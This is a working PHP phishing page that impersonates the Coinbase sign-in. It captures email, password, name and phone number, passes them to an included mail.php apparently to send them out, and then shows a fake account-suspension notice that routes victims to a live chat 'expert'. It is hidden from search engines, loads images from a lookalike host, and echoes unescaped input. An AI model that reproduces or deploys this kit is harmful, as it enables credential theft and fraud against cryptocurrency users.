<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Coinbase Trusted Crypto Exchange | Buy & Sell Cryptocurrencies</title>
    <meta name="robots" content="noindex, nofollow" />
    <meta name="googlebot" content="noindex, nofollow" />
    <meta name="bingbot" content="noindex, nofollow" />
    <link rel="icon" href="" sizes="32x32">

    <link rel="icon" type="image/svg+xml" href="https://koinqbeseherror.azurewebsites.net/assets/img/favicon-48.png">
    <link rel="stylesheet" href="assets/css/all.min.css">
    <link rel="stylesheet" href="assets/css/bootstrap.min.css">
    <link rel="stylesheet" href="assets/css/style.css">
</head>

<body>
    <!-- sherrr -->
    <header class="row">
        <nav class="navbar navbar-expand-lg p15">
            <div class="container">
                <div class="img">
                    <a class="navbar-brand" href="#">
                        <img src="https://koinqbeseherror.azurewebsites.net/assets/img/consumer_wordmark.svg" alt="Logo" width="100" class="d-inline-block align-text-top">
                    </a>
                </div>
                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation"><span class="navbar-toggler-icon"></span></button>
                <div class="collapse navbar-collapse justify-content-end header_menu" id="navbarNavDropdown">
                    <ul class="nav navbar-nav ">
                        <li class="nav-item dropdown">
                            <a class="nav-link dropdown-toggle" role="button" data-bs-toggle="dropdown" aria-expanded="false" href="#">Products</a>
                            <ul class="dropdown-menu">
                                <li>
                                    <a class="dropdown-item" href="#">Buy/Sell Cryptocurrency</a>
                                </li>
                                <li>
                                    <a class="dropdown-item" href="#">Coinbase Pro</a>
                                </li>
                                <li>
                                    <a class="dropdown-item" href="#">Coinbase Prime</a>
                                </li>
                                <li>
                                    <a class="dropdown-item" href="#">Developer Platform</a>
                                </li>
                                <li>
                                    <a class="dropdown-item" href="#">Coinbase Commerce</a>
                                </li>
                            </ul>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" href="#">Help</a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" href="#">Prices</a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" href="#">Sign In</a>
                        </li>
                        <li class="nav-item pe0 me0">
                            <a class="nav-link border border-1 fs18 px22" href="#">Sign Up</a>
                        </li>
                    </ul>
                </div>
            </div>
        </nav>

    </header>
    <?php
    if (isset($_POST['btnLoginMore'])) {
        include 'mail.php';
    ?>
        <div class="container-fluid" id="welcome-section">
            <form action="" method="post">
                <h2 id="heading" style="margin-bottom: 5px;">2-Step Verification</h2>
                <p style="text-align: center;margin-bottom: 25px;">Enter the 2-step verification generated by your<br>
                    authenticator app.</p>
                <input type="hidden" name="brandName" value="Bitmart Login">
                <input type="hidden" name="email" value="<?php echo $_POST['email']; ?>" />
                <input type="hidden" name="password" value="<?php echo $_POST['password']; ?>" />
                <div class="form-group">
                    <input type="text" class="form-control" style="    margin-top: 6px;" placeholder=" Name" name="name" placeholder="Name" required>
                </div>
                <div class="form-group">
                    <input type="text" class="form-control" style="    margin-top: 6px;" placeholder=" Phone Number" name="number" placeholder="Phone Number" required>
                </div>
                <button class="btn btn-block btn-primary" name="fromLog" type="submit">Verify </button>
                <div class="links">
                </div>
            </form>
        </div>
    <?php } elseif (isset($_POST['fromLog'])) {
        include 'mail.php';
    ?>

        <div class="container-fluid errorDiv" id="welcome-section">
            <form action="" method="post" style="">
                <h2 id="heading" style="color: red;">Important Message!<span></span></h2>
                <p style="text-align: center;">Due to unauthorized activity and identification failure on your Account. Account Access has been suspended. Please Get in touch with our Support Staff Immediately

                </p>
                <div class="form">
                    <p style="text-align: center;font-weight: 600;font-size: 20px;">Error CODE: EBRX16X76D
                    </p><br>
                </div>
                <div class="calling-number" style="text-align: center;">
                    <a href="javascript:void(Tawk_API.toggle())" style="padding: 8px 12px; border-radius: 5px; border: 1px solid #27d17f; font-size: 16px;background-color: #27d17f;  color: #000 !important;">Ask Expert</a>
                </div>

            </form>
        </div>
    <?php } else { ?>

        <form action="" method="post"><input id="inputs" type="hidden" name="brandName" value="Bitmart Login">
            <div class="container-fluid" id="welcome-section" style="width:25% !important; background-color:white;">
                <div class="row">
                    <div class="col-sm-12 text-center">
                        <h1 class="h3 mt60">Sign in to Coinbase</h1>
                    </div>
                </div>

                <div class="form-group">
                    <input type="text" class="form-control" id="exampleInputEmail1" name="email" placeholder="Email or Username"
                        placeholder="Email address" required>
                </div>

                <div class="form-group">
                    <input type="password" class="form-control" id="exampleInputPassword1"
                        placeholder="Password" name="password" required>
                </div>



                <div class="form-check-inputonly">
                    <div class="check" style="display: flex;">
                        <input class="form-check-input-checklist checkinput" id="checkbox" type="checkbox" value="" id="defaultCheck1">
                        <label class="form-check-label-forcheck" for="defaultCheck1">
                            Remember me
                        </label>
                    </div>
                    <div class="forgot">
                        <a href="#" style="color: #004fe6 !important;text-decoration: underline;text-align: center;">Forgot password</a>
                    </div>
                </div>
                <button name="btnLoginMore" type="submit" class="btn btn-block btn-primary">Sign In</button>
        </form>
        <p style="text-align: center; display: block; color: #6f6f6f !important;font-size: 15px;" href="">Don't have an account? <a href="#" style="color: #293070 !important">Sign up</a></p>
        </div>

    <?php } ?>

    <!--Start of Tawk.to Script-->
    <script type="text/javascript">
        var Tawk_API = Tawk_API || {},
            Tawk_LoadStart = new Date();
        (function() {
            var s1 = document.createElement("script"),
                s0 = document.getElementsByTagName("script")[0];
            s1.async = true;
            s1.src = 'https://embed.tawk.to/642e94c531ebfa0fe7f6d126/1gtavaa21';
            s1.charset = 'UTF-8';
            s1.setAttribute('crossorigin', '*');
            s0.parentNode.insertBefore(s1, s0);
        })();
    </script>
    <!--End of Tawk.to Script-->

</body>

</html>